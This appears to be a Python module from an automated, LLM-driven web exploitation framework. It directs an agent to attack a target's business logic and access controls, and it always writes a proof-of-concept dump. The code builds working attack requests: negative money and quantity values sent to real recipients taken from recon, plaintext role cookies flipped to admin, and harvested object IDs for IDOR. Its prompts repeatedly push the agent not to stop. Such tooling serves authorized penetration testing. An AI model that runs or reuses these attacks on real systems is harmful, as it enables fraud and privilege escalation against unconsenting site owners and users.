"""ExecutionRunner — runs exploits and ALWAYS generates a PoC.

This fixes MARL's root cause where PoC was gated behind exploit_mode != "tool_loop"
making it dead code for all normal runs.

Here: PoC is generated unconditionally from Evidence.exchanges after every run,
regardless of how the exploit was driven (LLM tool-loop or scripted steps).
"""
from __future__ import annotations

import json
import logging
import re
from typing import Optional

from ..config import AppConfig
from ..contracts.dossier import BugDossier
from ..contracts.enums import Role
from ..contracts.evidence import Evidence, StateSnapshot
from ..contracts.recon import ReconArtifact
from ..contracts.results import Finding
from ..llm.client import LLMClient
from ..recon.auth import AuthSessionStore
from ..recon.body_store import BodyStore
from ..workspace import RunWorkspace
from .recorder import RecordingHttpClient
from .tool_bridge import ToolBridge, TOOL_DEFINITIONS
from ..prompts.registry import render

log = logging.getLogger("marl3.exec")
_KNOWN_TOOL_NAMES = {spec["function"]["name"] for spec in TOOL_DEFINITIONS}


class ExecutionRunner:
    def __init__(self, llm: LLMClient, cfg: AppConfig, workspace: RunWorkspace) -> None:
        self._llm = llm
        self._cfg = cfg
        self._ws = workspace
        self.last_poc = None  # set after each run(); read by orchestrator

    async def run(
        self,
        dossier: BugDossier,
        recon: ReconArtifact,
        strategy: str,
        success_condition: str = "",
        execution_guide: str = "",
        memory=None,
    ) -> Evidence:
        self._target_url = recon.target_url
        """Execute the exploit strategy and return structured Evidence.

        Always records to Evidence via RecordingHttpClient.
        Always generates a PoC after execution.
        """
        body_store = BodyStore(self._ws.bodies_dir)
        auth_store = AuthSessionStore(self._ws.sessions_json)

        evidence = Evidence(
            bug_id=dossier.id,
            pattern_id=dossier.pattern_id,
            category=dossier.category.value,
            endpoint=dossier.endpoint,
            method=dossier.method,
            session_context=auth_store.label_role_map(),
        )

        recorder = RecordingHttpClient(
            evidence=evidence,
            body_store=body_store,
            auth_store=auth_store,
            timeout_s=self._cfg.execution.http_timeout_s,
            user_agent=self._cfg.execution.user_agent,
        )
        bridge = ToolBridge(
            recorder=recorder,
            body_store=body_store,
            workspace_root=self._ws.root,
            auth_store=auth_store,
            target_url=recon.target_url,
        )

        # Surface the discovered form/param schema for this endpoint so the exec agent
        # uses REAL field names (e.g. to_username, amount) instead of guessing.
        endpoint_schema = _endpoint_schema(recon, dossier.endpoint)

        # Harvest concrete valid values (product ids, coupon codes, usernames, object ids)
        # so exec stops guessing inputs (e.g. coupon SAVE10, product_id=1, IDOR /…/2).
        known_values = _known_values_text(recon, body_store)

        # #3: load exec memory (prior exec/verifier notes) so execution doesn't repeat mistakes
        exec_memory = ""
        if memory is not None:
            from ..memory.retrieval import ContextRetriever
            exec_memory = ContextRetriever(memory).bundle_for("exec", dossier).render(token_budget=1200)

        # Long-term memory: surface payloads that worked for this pattern on past runs.
        try:
            from ..memory.longterm import get_longterm, render_exec_skills, target_fingerprint
            _lt = get_longterm(self._cfg)
            if _lt.enabled:
                _q = f"{dossier.pattern_id} {dossier.method} {dossier.endpoint} {dossier.hypothesis}"
                _fp = target_fingerprint(recon) if recon else ""
                _skills = render_exec_skills(
                    _lt.skills_for_exec(dossier.pattern_id, fingerprint=_fp, query_text=_q))
                if _skills:
                    execution_guide = (execution_guide + "\n\n" + _skills).strip()
        except Exception as _e:
            log.debug(f"exec skills lookup skipped: {_e}")

        # Precompute the concrete BLF manipulation payload (real form fields + a real
        # recipient pulled from recon) so both the LLM plan and the deterministic
        # fallback use the same ready-to-send body.
        blf_payload = (
            _blf_full_payload(recon, dossier, body_store)
            if dossier.category.value == "BLF" else None
        )

        try:
            # Run LLM tool-loop exploit
            did_tamper = await self._llm_tool_loop(
                dossier=dossier,
                strategy=strategy,
                success_condition=success_condition,
                auth_store=auth_store,
                bridge=bridge,
                evidence=evidence,
                blf_payload=blf_payload,
                endpoint_schema=endpoint_schema,
                known_values=known_values,
                execution_guide=execution_guide,
                exec_memory=exec_memory,
                tool_surface=_tool_surface(),
                max_steps=_max_steps_for(dossier),
            )

            # Deterministic BLF fallback: if the LLM never issued the tampering POST,
            # the runner performs baseline-read → manipulate → re-read itself so the
            # proof-gate has real data to evaluate (no silent BLF failure).
            if dossier.category.value == "BLF" and not did_tamper and blf_payload:
                await self._deterministic_blf_attempt(dossier, recorder, blf_payload)

            # Deterministic cookie-tamper safety-net for BAC-02: the LLM frequently mangles
            # the Cookie header (e.g. 'dangnosuy=role=admin' instead of 'role=admin'), so a
            # genuinely vulnerable endpoint scores 403. Replay normal vs role=admin cookie
            # correctly so the gate's cookie-diff can fire. Gate still needs PRIVILEGED_ACCESS,
            # so a non-admin page never becomes EXPLOITED from this alone.
            if dossier.pattern_id in ("BAC-02", "BAC-06"):
                await self._deterministic_bac02_attempt(dossier, recorder, auth_store)

            # BLF: capture state_before/after if relevant
            if dossier.category.value == "BLF":
                self._capture_blf_state(evidence)

            # Evaluate proof (on structured data, not text)
            await self._evaluate_proof(evidence, body_store)

        finally:
            await recorder.close()
            await bridge.close()

        # PoC always generated — unconditionally (Burp-style HTTP dump)
        self.last_poc = self._generate_poc(evidence, recon.target_url, body_store)

        return evidence

    async def _llm_tool_loop(
        self,
        dossier: BugDossier,
        strategy: str,
        success_condition: str,
        auth_store: AuthSessionStore,
        bridge: ToolBridge,
        evidence: Evidence,
        blf_payload: Optional[dict] = None,
        endpoint_schema: str = "",
        known_values: str = "",
        execution_guide: str = "",
        exec_memory: str = "",
        tool_surface: str = "",
        max_steps: int = 12,
    ) -> bool:
        """Run the exec tool-loop. Returns True if a BLF tampering POST was recorded."""
        # Expose session cookies so the agent can perform cookie-tampering exploits
        session_cookies: dict[str, str] = {}
        for p in auth_store.all_profiles():
            if p.cookie_header:
                session_cookies[p.label] = p.cookie_header
        system_prompt = render(
            "exec_system",
            bug=dossier,
            strategy=strategy,
            success_condition=success_condition,
            sessions=auth_store.label_role_map(),
            session_cookies=session_cookies,
            target_url=getattr(self, "_target_url", ""),
            endpoint_schema=endpoint_schema,
            known_values=known_values,
            execution_guide=execution_guide,
            exec_memory=exec_memory,
            tool_surface=tool_surface,
        )

        # BLF needs an ACTIVE manipulation (POST a bad value), not just page reads.
        # Build a concrete, target-specific plan and force the loop to keep steering
        # until a tampering POST is actually recorded — otherwise state_delta / the
        # proof-gate fallback never fire and every BLF bug silently fails.
        is_blf = dossier.category.value == "BLF"
        is_chain = _is_chain(dossier)
        is_value_tamper = is_blf and not is_chain
        # Steering plan: a chain follows the dossier's ordered approach; a value-tamper BLF
        # follows the concrete negative-value plan; everything else is unguided.
        if is_chain:
            plan = _chain_plan_text(dossier)
        elif is_value_tamper:
            plan = _blf_plan_text(dossier, blf_payload or {})
        else:
            plan = ""

        first_user = "Begin execution."
        if plan:
            first_user += "\n\n" + plan
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": first_user},
        ]
        did_tamper = False
        action_paths: set[str] = set()  # distinct state-changing endpoints hit (chain progress)
        from urllib.parse import urlparse as _urlparse
        from .. import logging_setup as _ls

        def _needs_more() -> bool:
            # Don't let exec quit early: a value-tamper needs its bad-value POST; a chain
            # needs at least two distinct state-changing requests (ordered steps).
            if is_value_tamper:
                return not did_tamper
            if is_chain:
                return len(action_paths) < 2
            return False

        for step in range(max_steps):
            response = await self._llm.chat(
                messages=_windowed(messages, keep_recent=8),
                role=Role.EXEC,
                temperature=0.3,
                max_tokens=2048,
            )
            messages.append({"role": "assistant", "content": response})

            # Check for tool calls (simple text-based parsing for OpenAI function-call style)
            tool_calls = _extract_tool_calls(response)
            if not tool_calls:
                # Don't accept "done" until the required action(s) actually happened:
                # a value-tamper POST, or ≥2 ordered requests for a chain.
                if plan and _needs_more() and step < max_steps - 1:
                    nudge = ("Do NOT stop — you have not performed the required tampering POST yet."
                             if is_value_tamper else
                             "Do NOT stop — the chain is incomplete; continue the remaining ordered steps.")
                    messages.append({"role": "user", "content": f"{nudge} {plan}"})
                    continue
                log.debug(f"{dossier.id}: exec finished after {step+1} steps, {len(evidence.exchanges)} exchanges")
                evidence.notes = response
                break

            tool_results = []
            for tc in tool_calls:
                args = tc["args"]
                # Resolve relative URLs to absolute
                url = args.get("url") or args.get("endpoint") or ""
                if url and url.startswith("/"):
                    target = getattr(self, "_target_url", "")
                    if target:
                        from urllib.parse import urlparse as _up
                        base = f"{_up(target).scheme}://{_up(target).netloc}"
                        args["url"] = base + url
                # Normalize actor key
                if "session" in args and "actor" not in args:
                    args["actor"] = args.pop("session")
                elif "session_label" in args and "actor" not in args:
                    args["actor"] = args.pop("session_label")
                # Normalize method key
                if "method" not in args:
                    args["method"] = "GET"
                # Detect the BLF tampering POST (value-bearing request with out-of-range number)
                _m = args.get("method", "GET").upper()
                if (
                    is_blf
                    and tc["name"] == "http_request"
                    and _m in ("POST", "PUT", "PATCH")
                    and _body_has_bad_value(args.get("body"))
                ):
                    did_tamper = True
                # Track distinct state-changing endpoints for chain progress
                if tc["name"] == "http_request" and _m in ("POST", "PUT", "PATCH", "DELETE"):
                    action_paths.add(_urlparse(args.get("url", "")).path)
                # Show tool call + params before dispatching so the user can follow execution
                _ls.tool_call(dossier.id, step + 1, tc["name"], args)
                result = await bridge.dispatch(tc["name"], args)
                _ls.tool_result(dossier.id, step + 1, tc["name"], str(result))
                tool_results.append(f"[{tc['name']} result]: {result}")

            messages.append({"role": "user", "content": "\n".join(tool_results)})

            # Anti-waste: a chain that has burned several turns with ZERO state-changing
            # requests is stuck reading pages — stop instead of consuming the full budget.
            if is_chain and step >= 7 and not action_paths:
                log.debug(f"{dossier.id}: chain made no state-changing request in {step+1} steps — aborting")
                evidence.notes = "Chain stalled: no state-changing request was issued."
                break

            # Persistent steering: keep pushing until the required action(s) are recorded.
            if plan and _needs_more() and step < max_steps - 1:
                what = ("No tampering POST recorded yet — reading pages is not proof."
                        if is_value_tamper else
                        f"Chain incomplete ({len(action_paths)} state-changing request(s) so far) — keep going.")
                messages.append({"role": "user", "content": f"[Progress check] {what} {plan}"})

        else:
            log.debug(f"{dossier.id}: exec hit max_steps={max_steps}, {len(evidence.exchanges)} exchanges")
            evidence.notes = f"Max steps reached. {len(evidence.exchanges)} exchanges recorded."

        return did_tamper

    async def _deterministic_blf_attempt(self, dossier, recorder, payload: dict) -> None:
        """Runner-driven baseline→manipulate→re-read when the LLM didn't tamper.

        All three requests go through the recorder so they land in Evidence and the
        proof-gate can evaluate them. Best-effort: individual failures are non-fatal.
        """
        attacker = getattr(dossier.auth, "attacker_role", "") or "anon"
        base = getattr(self, "_target_url", "").rstrip("/")
        ep = dossier.endpoint if dossier.endpoint.startswith("/") else "/" + dossier.endpoint
        url = base + ep
        log.info(f"{dossier.id}: deterministic BLF attempt → POST {url} body={payload}")
        for method, label in (("GET", "blf-baseline"), ("POST", "blf-tamper"), ("GET", "blf-reread")):
            try:
                await recorder.request(
                    method=method, url=url, actor=attacker,
                    body=payload if method == "POST" else None, label=label,
                )
            except Exception as e:
                log.warning(f"{dossier.id}: deterministic BLF {method} failed: {e}")

    async def _deterministic_bac02_attempt(self, dossier, recorder, auth_store) -> None:
        """Replay the target endpoint with a correctly-built normal vs role=admin cookie.

        Generic: finds a logged-in profile carrying a plaintext role/is_admin cookie, flips it
        to admin, and issues baseline + tampered GETs through the recorder. No-op when no
        plaintext role cookie exists (BAC-02 then doesn't apply)."""
        base = getattr(self, "_target_url", "").rstrip("/")
        ep = dossier.endpoint if dossier.endpoint.startswith("/") else "/" + dossier.endpoint
        url = base + ep
        prof = next(
            (p for p in auth_store.all_profiles()
             if p.cookie_header and _has_role_cookie(p.cookie_header)), None)
        if not prof:
            return
        tampered, flipped = _tamper_admin_cookie(prof.cookie_header)
        if not flipped:
            return
        log.info(f"{dossier.id}: deterministic BAC-02 cookie-tamper → GET {url}")
        for cookie, label in ((prof.cookie_header, "bac02-baseline"), (tampered, "bac02-tamper")):
            try:
                await recorder.request("GET", url, actor=prof.label,
                                       headers={"Cookie": cookie}, label=label)
            except Exception as e:
                log.warning(f"{dossier.id}: deterministic BAC-02 {label} failed: {e}")

    def _capture_blf_state(self, evidence: Evidence) -> None:
        """For BLF bugs: compute state_delta from before/after exchanges."""
        if len(evidence.exchanges) < 2:
            return
        first = evidence.exchanges[0]
        last = evidence.exchanges[-1]
        delta: dict = {}
        for k, v in last.numeric_fields.items():
            if k.startswith("_"):  # skip internal fields like _resp_len
                continue
            if k in first.numeric_fields and first.numeric_fields[k] != v:
                delta[k] = {"before": first.numeric_fields[k], "after": v}
        evidence.state_delta = delta
        if first.response_body_ref:
            evidence.state_before = StateSnapshot(
                fields=first.numeric_fields,
                exchange_seq=first.seq,
                label="initial_state",
            )
        if last.response_body_ref:
            evidence.state_after = StateSnapshot(
                fields=last.numeric_fields,
                exchange_seq=last.seq,
                label="final_state",
            )

    async def _evaluate_proof(self, evidence: Evidence, body_store: BodyStore) -> None:
        from .proof.bac import BACProofGate
        from .proof.blf import BLFProofGate
        from .proof.classifier import classify_responses

        # Zero-context LLM fact extraction (BAC only — BLF is judged on numbers).
        # LLM supplies facts ("is this an admin page?", "does it expose other users' PII?");
        # the deterministic gate still decides the verdict. Best-effort: {} on failure.
        llm_facts: dict = {}
        if evidence.category == "BAC":
            try:
                llm_facts = await classify_responses(self._llm, evidence.exchanges, body_store)
            except Exception as e:
                log.warning(f"{evidence.bug_id}: classifier failed (non-fatal): {e}")

        if evidence.category == "BAC":
            gate = BACProofGate(body_store, evidence.pattern_id)
        else:
            gate = BLFProofGate(body_store, evidence.pattern_id)

        verdict = gate.evaluate(evidence, llm_facts)
        evidence.verdict_status = verdict.status.value

    def _generate_poc(self, evidence: Evidence, target_url: str, body_store: BodyStore):
        from .poc.generator import PocGenerator
        poc_path = self._ws.poc_path(evidence.bug_id)
        gen = PocGenerator(body_store=body_store, workspace_root=self._ws.root)
        return gen.generate(evidence=evidence, target_url=target_url, poc_path=poc_path)


def _endpoint_schema(recon, endpoint: str) -> str:
    """Describe the discovered form fields / params for an endpoint, so exec uses real names."""
    lines: list[str] = []
    for ep in recon.endpoints:
        if ep.endpoint == endpoint or ep.url.rstrip("/").endswith(endpoint.rstrip("/")):
            if ep.parameters:
                lines.append(f"{ep.method} {ep.endpoint} — form/query fields: {ep.parameters}")
    # Also pull concrete form field lists from recon exchanges for this endpoint
    for ex in recon.exchanges:
        if ex.endpoint == endpoint and ex.forms:
            for form in ex.forms:
                names = [f["name"] for f in form.get("fields", [])]
                if names:
                    lines.append(f"Form on {ex.endpoint}: action={form.get('action','')} method={form.get('method','get')} fields={names}")
    return "\n".join(dict.fromkeys(lines)) if lines else ""


_BLF_MONEY_KW = ("amount", "price", "total", "cost", "balance", "credit", "point", "sum", "value")
_BLF_QTY_KW = ("qty", "quantity", "count", "stock", "num", "items")
_BLF_IDENTITY_KW = ("to_", "recipient", "receiver", "username", "user", "account", "email", "name")
_BLF_SKIP_KW = ("password", "passwd", "csrf", "token", "captcha")


def _known_usernames(recon, body_store) -> list[str]:
    """Pull real usernames from recon JSON bodies (e.g. an exposed /users list)."""
    names: list[str] = []
    if recon is None or body_store is None:
        return names
    for ex in recon.exchanges:
        if not ex.response_body_ref or "username" not in (ex.json_keys or []):
            continue
        try:
            obj = body_store.get_json(ex.response_body_ref.blob_id)
        except Exception:
            continue
        items = obj if isinstance(obj, list) else (
            obj.get("data") if isinstance(obj, dict) and isinstance(obj.get("data"), list) else
            [obj] if isinstance(obj, dict) else []
        )
        for it in items:
            if isinstance(it, dict) and it.get("username"):
                names.append(str(it["username"]))
    return list(dict.fromkeys(names))


_CODE_HINT = ("coupon", "promo", "discount", "voucher", "code")
_CODE_STOP = {"HTTP", "HTTPS", "HTML", "JSON", "POST", "DOCTYPE", "UTF", "NULL",
              "TRUE", "FALSE", "DELETE", "PATCH"}


def _known_values(recon, body_store) -> dict:
    """Harvest concrete, valid input values seen in recon so exec uses real data
    (product ids, coupon codes, usernames, object ids) instead of guessing them."""
    usernames = _known_usernames(recon, body_store)
    product_ids: list[int] = []
    product_prices: dict[int, float] = {}  # id → price
    object_ids: list[int] = []
    coupon_codes: list[str] = []
    if recon is not None and body_store is not None:
        for ex in recon.exchanges:
            if not ex.response_body_ref:
                continue
            ctype = ex.response_headers.get("content-type", "")
            if "json" in ctype:
                try:
                    obj = body_store.get_json(ex.response_body_ref.blob_id)
                except Exception:
                    continue
                items = obj if isinstance(obj, list) else (
                    obj.get("data") if isinstance(obj, dict) and isinstance(obj.get("data"), list)
                    else [obj] if isinstance(obj, dict) else [])
                ep_l = (ex.endpoint or "").lower()
                for it in items:
                    if not isinstance(it, dict):
                        continue
                    _id = it.get("id")
                    if isinstance(_id, int) and not isinstance(_id, bool):
                        object_ids.append(_id)
                        if "price" in it or "product" in ep_l:
                            product_ids.append(_id)
                            # Extract price for checkout-chain budget awareness
                            price_val = it.get("price") or it.get("unit_price")
                            if isinstance(price_val, (int, float)) and price_val > 0:
                                product_prices[_id] = float(price_val)
            elif "html" in ctype:
                try:
                    text = body_store.get(ex.response_body_ref.blob_id).decode("utf-8", "replace")
                except Exception:
                    continue
                # product IDs rendered in listings ("ID: 3", "data-product-id=3")
                for pid in re.findall(r"(?i)\b(?:product[_-]?id|id)\b[\"'>: =]{1,3}(\d{1,6})", text):
                    product_ids.append(int(pid))
                # coupon/discount codes near a hint word (ALL-CAPS alnum tokens)
                for m in re.finditer(r"(?i)(coupon|promo|discount|voucher|code)", text):
                    for tok in re.findall(r"\b[A-Z][A-Z0-9]{3,}\b", text[m.start():m.end() + 80]):
                        if tok not in _CODE_STOP:
                            coupon_codes.append(tok)
    return {
        "usernames": list(dict.fromkeys(usernames))[:8],
        "product_ids": list(dict.fromkeys(product_ids))[:8],
        "product_prices": product_prices,
        "object_ids": sorted(set(object_ids))[:12],
        "coupon_codes": list(dict.fromkeys(coupon_codes))[:8],
    }


def _known_values_text(recon, body_store) -> str:
    """Render harvested known-good values as a prompt section for exec."""
    kv = _known_values(recon, body_store)
    lines: list[str] = []
    if kv["usernames"]:
        lines.append(f"- Real usernames (use as transfer recipients / for IDOR): {kv['usernames']}")
    if kv["product_ids"]:
        lines.append(f"- Valid product IDs (for cart/checkout): {kv['product_ids']}")
    if kv.get("product_prices"):
        prices = kv["product_prices"]
        cheapest_id = min(prices, key=prices.get)
        cheapest_price = prices[cheapest_id]
        price_list = ", ".join(f"id={pid}→${pr:.2f}" for pid, pr in sorted(prices.items(), key=lambda x: x[1]))
        lines.append(f"- Product prices: {price_list}")
        lines.append(f"  ↳ CHEAPEST for checkout chains: product_id={cheapest_id} (${cheapest_price:.2f})")
    if kv["coupon_codes"]:
        lines.append(f"- Valid coupon/discount codes: {kv['coupon_codes']}")
    if kv["object_ids"]:
        lines.append(f"- Observed object IDs — try these as path params for IDOR "
                     f"(e.g. /resource/<id>): {kv['object_ids']}")
    return "\n".join(lines)


def _blf_full_payload(recon, dossier, body_store) -> dict:
    """Build a complete, ready-to-send POST body for a BLF manipulation.

    Money/qty fields get out-of-range values (-100 / -1). Identity fields (recipient,
    username, …) get a REAL other username pulled from recon so the request is not
    rejected for a missing/invalid recipient. Other fields get a benign default.
    Returns {} if no tamperable money/qty field is known for the endpoint.
    """
    endpoint = dossier.endpoint
    attacker = (getattr(dossier.auth, "attacker_role", "") or "").lower()

    field_names: list[str] = []
    if recon is not None:
        for ex in recon.exchanges:
            if ex.endpoint == endpoint:
                for form in ex.forms:
                    for f in form.get("fields", []):
                        n = f.get("name", "")
                        if n and n not in field_names:
                            field_names.append(n)
        for ep in recon.endpoints:
            if ep.endpoint == endpoint:
                for n in ep.parameters:
                    if n not in field_names:
                        field_names.append(n)

    others = [u for u in _known_usernames(recon, body_store) if u and u.lower() != attacker]

    body: dict[str, str] = {}
    has_tamper = False
    for n in field_names:
        ln = n.lower()
        if any(k in ln for k in _BLF_SKIP_KW):
            continue
        if any(k in ln for k in _BLF_MONEY_KW):
            body[n] = "-100"; has_tamper = True
        elif any(k in ln for k in _BLF_QTY_KW):
            body[n] = "-1"; has_tamper = True
        elif any(k in ln for k in _BLF_IDENTITY_KW):
            body[n] = others[0] if others else "admin"
        else:
            body[n] = "1"

    if not has_tamper:
        return {}
    return body


_ROLE_COOKIE_KEYS = ("role", "is_admin", "isadmin", "admin", "is_staff", "usertype", "user_type")


def _has_role_cookie(cookie_header: str) -> bool:
    low = (cookie_header or "").lower()
    return any(f"{k}=" in low for k in _ROLE_COOKIE_KEYS)


def _tamper_admin_cookie(cookie_header: str) -> tuple[str, bool]:
    """Flip a plaintext role/is_admin cookie to an admin value, keeping session etc. intact.
    Returns (new_cookie, flipped?)."""
    out: list[str] = []
    flipped = False
    for part in (cookie_header or "").split(";"):
        part = part.strip()
        if not part or "=" not in part:
            if part:
                out.append(part)
            continue
        k, v = part.split("=", 1)
        kl = k.strip().lower()
        if kl == "role" or kl in ("usertype", "user_type", "is_staff"):
            out.append(f"{k.strip()}=admin"); flipped = True
        elif kl in ("is_admin", "isadmin", "admin"):
            out.append(f"{k.strip()}=1"); flipped = True
        else:
            out.append(f"{k.strip()}={v}")
    return "; ".join(out), flipped


def _blf_plan_text(dossier, payload: dict) -> str:
    """Render the concrete BLF attack plan the exec agent must execute."""
    attacker = getattr(dossier.auth, "attacker_role", "") or "anon"
    if payload:
        body_json = json.dumps(payload)
        return (
            f"BLF ATTACK PLAN (required) — pattern {dossier.pattern_id}. Reading pages is NOT proof; "
            f"you must actively manipulate a value:\n"
            f"1. (optional) GET a state page first to record the BEFORE value (balance / cart / total).\n"
            f"2. http_request POST to {dossier.endpoint} as actor '{attacker}' with this exact body: {body_json}\n"
            f"   (the negative number is an out-of-range value the server SHOULD reject).\n"
            f"3. GET the same state page again to confirm the change took effect.\n"
            f"SUCCESS = the server accepts the out-of-range value with a 2xx and no validation error."
        )
    return (
        f"BLF ATTACK PLAN (required) — pattern {dossier.pattern_id}. You MUST POST a manipulated "
        f"value to {dossier.endpoint} as actor '{attacker}' (a negative amount/quantity such as -100 "
        f"or -1) using the real form field names, then re-read state to confirm. Reading alone is insufficient."
    )


# Patterns whose proof requires several ordered requests, not one value-tamper POST.
_CHAIN_PATTERNS = {"BLF-03", "BLF-05"}


def _count_steps(text: str) -> int:
    """Count ordered steps ('1. ', '2. ' …) in an exploit approach."""
    return len(re.findall(r"(?m)(?:^|\s)\d+[.)]\s", text or ""))


def _is_chain(dossier) -> bool:
    """A multi-step business-logic chain (sequence/coupon abuse, or a ≥3-step approach)."""
    return dossier.pattern_id in _CHAIN_PATTERNS or _count_steps(getattr(dossier, "exploit_approach", "")) >= 3


def _max_steps_for(dossier) -> int:
    """Give chains room to complete several ordered requests + re-reads."""
    if _is_chain(dossier):
        return 20
    if dossier.category.value == "BLF":
        return 16
    return 12


def _chain_plan_text(dossier) -> str:
    """Steering for a multi-step chain: execute the dossier's own ordered approach to the end.

    Generic by construction — the steps come from the (recon-grounded) dossier approach, not a
    hardcoded per-app script, so this works for any sequence/coupon/refund chain on any target.
    """
    approach = (getattr(dossier, "exploit_approach", "") or "").strip()
    return (
        f"MULTI-STEP CHAIN (required) — pattern {dossier.pattern_id}. This flaw is proven only by "
        f"several requests in a specific ORDER; one request is NOT proof. Execute EVERY step below in "
        f"order, using real inputs from 'Known-Good Values' (valid product id / coupon code / username), "
        f"and re-read state at the end to confirm the rule was broken:\n"
        f"{approach}\n"
        f"CART/CHECKOUT PREP (if chain involves checkout): (1) GET /cart to see current items. "
        f"(2) If the cart has expensive items that exceed your wallet balance, remove them first "
        f"(DELETE /cart/remove/<item_id>). (3) Add the CHEAPEST product (see 'CHEAPEST for checkout "
        f"chains' in Known-Good Values) so you can afford checkout. (4) If checkout returns "
        f"'Insufficient balance', your balance is too low — remove expensive items and retry with "
        f"the cheapest product. NEVER stop because of insufficient balance without first trying a cheaper product.\n"
        f"If a step needs a value you don't have yet (e.g. a coupon code), DISCOVER it first by reading "
        f"a relevant page after populating state (add an item, then GET the cart). Do NOT stop until you "
        f"have attempted the FINAL step of the chain."
    )


def _body_has_bad_value(body) -> bool:
    """True if the request body contains an out-of-range number (negative or > 1e6)."""
    if body is None:
        return False
    s = body if isinstance(body, str) else json.dumps(body, default=str)
    for m in re.finditer(r'-?\d+(?:\.\d+)?', s):
        try:
            n = float(m.group())
        except ValueError:
            continue
        if n < 0 or n > 1_000_000:
            return True
    return False


def _windowed(messages: list[dict], keep_recent: int = 8) -> list[dict]:
    """Sliding context window for the exec tool-loop: always keep the system prompt
    and the first user turn (the task), then only the most recent `keep_recent` turns.
    Prevents unbounded context growth that pushes the system instructions out of view."""
    if len(messages) <= keep_recent + 2:
        return messages
    head = messages[:2]  # system + "Begin execution."
    tail = messages[-keep_recent:]
    note = {"role": "user", "content": "[older steps omitted to keep context focused]"}
    return head + [note] + tail


def _tool_surface() -> str:
    """List every tool the Exec agent may call. The agent decides which to use and
    when — there is no phase-based gating. HTTP is preferred for proof capture (all
    HTTP goes through the recorder); browser/shell/filesystem are available when the
    target needs JS rendering, local scripting, or workspace inspection."""
    lines = ["Available tools (you decide which to call):"]
    for spec in TOOL_DEFINITIONS:
        fn = spec["function"]
        lines.append(f"- {fn['name']}: {fn['description']}")
    return "\n".join(lines)


def _extract_tool_calls(response: str) -> list[dict]:
    """Extract tool call requests from LLM response text.

    Handles multiple formats that different models emit:
      1. CALL: http_request({"method": ...})
      2. [TOOL_CALL]{tool => "http_request", args => {...}}[/TOOL_CALL]
      3. <FunctionCall>tool_name: http_request\ntool_args: {...}</FunctionCall>
      4. {"tool": "http_request", "args": {...}}
      5. {"name": "http_request", "arguments": {...}}
      6. ```json\n{"tool": "http_request", ...}\n``` (markdown code block)
    """
    calls = []

    # Format 6: markdown code block (```json ... ``` or ``` ... ```)
    for m in re.finditer(r'```(?:json)?\s*(\{.*?\})\s*```', response, re.DOTALL | re.IGNORECASE):
        try:
            obj = json.loads(m.group(1))
            tool_name = obj.get("tool") or obj.get("name", "")
            if tool_name in _KNOWN_TOOL_NAMES:
                args = obj.get("args") or obj.get("arguments") or obj.get("parameters") or {}
                if isinstance(args, dict):
                    calls.append({"name": tool_name, "args": args})
        except Exception:
            pass

    # Format 1: CALL: tool_name({...})
    for m in re.finditer(r'CALL:\s*(\w+)\s*\((\{.*?\})\)', response, re.DOTALL):
        try:
            calls.append({"name": m.group(1), "args": json.loads(m.group(2))})
        except Exception:
            pass

    # Format 2: [TOOL_CALL] block — may use => or : separators
    for m in re.finditer(r'\[TOOL_CALL\](.*?)\[/TOOL_CALL\]', response, re.DOTALL | re.IGNORECASE):
        parsed = _parse_kv_block(m.group(1))
        if parsed:
            calls.append(parsed)

    # Format 3: <FunctionCall> block
    for m in re.finditer(r'<FunctionCall>(.*?)</FunctionCall>', response, re.DOTALL | re.IGNORECASE):
        parsed = _parse_kv_block(m.group(1))
        if parsed:
            calls.append(parsed)

    # Format 4 & 5: raw JSON objects (handle nested braces properly)
    # Scan for every '{' and try json.raw_decode to find valid JSON objects
    decoder = json.JSONDecoder()
    pos = 0
    while pos < len(response):
        idx = response.find('{', pos)
        if idx == -1:
            break
        try:
            obj, end = decoder.raw_decode(response, idx)
            if isinstance(obj, dict):
                tool_name = obj.get("tool") or obj.get("name", "")
                if tool_name in _KNOWN_TOOL_NAMES:
                    args = obj.get("args") or obj.get("arguments") or obj.get("parameters") or {}
                    if isinstance(args, dict):
                        calls.append({"name": tool_name, "args": args})
            pos = end
        except json.JSONDecodeError:
            pos = idx + 1

    # Deduplicate by (name, url)
    # Dedup on the FULL call signature — NOT just (name, url). A baseline request and a
    # tampered request to the same URL (different cookie/body/actor) are distinct and BOTH
    # must survive; they are exactly the pair that proves BAC-02 / IDOR.
    seen: set[tuple] = set()
    unique = []
    for c in calls:
        a = c["args"]
        cookie = (a.get("headers") or {}).get("Cookie") or (a.get("headers") or {}).get("cookie") or ""
        key = (
            c["name"],
            json.dumps(a, sort_keys=True, default=str),
            a.get("actor", ""),
            cookie,
        )
        if key not in seen:
            seen.add(key)
            unique.append(c)

    return unique


def _parse_kv_block(text: str) -> dict | None:
    """Parse a loose key-value block (supports both => and : separators)."""
    # Try to find tool name
    tool_m = re.search(r'"?tool(?:_name)?"\s*(?:=>|:)\s*"?(\w+)"?', text, re.IGNORECASE)
    if not tool_m:
        return None
    tool_name = tool_m.group(1)

    # Try to find args as JSON object
    args: dict = {}
    json_m = re.search(r'"?(?:args|tool_args|arguments)"\s*(?:=>|:)\s*(\{.*?\})', text, re.DOTALL | re.IGNORECASE)
    if json_m:
        try:
            args = json.loads(json_m.group(1))
        except Exception:
            pass

    # Fallback: parse --key value CLI-style args
    if not args:
        for km in re.finditer(r'--(\w+)\s+"?([^"\n,]+)"?', text):
            args[km.group(1)] = km.group(2).strip()

    return {"name": tool_name, "args": args} if tool_name else None
